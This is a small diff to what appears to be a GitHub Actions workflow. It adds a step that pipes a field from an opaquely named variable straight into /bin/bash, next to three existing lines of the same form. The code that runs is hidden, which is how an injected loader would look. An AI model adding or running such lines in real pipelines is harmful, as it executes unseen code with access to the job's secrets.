@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$dbft0785" | jq -r .kv6 | /bin/bash
           printf '%s' "$nv9568" | jq -r .s3 | /bin/bash
           printf '%s' "$c47958" | jq -r .xnxri4 | /bin/bash
+          echo $rddjw985 | jq -r .e84 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
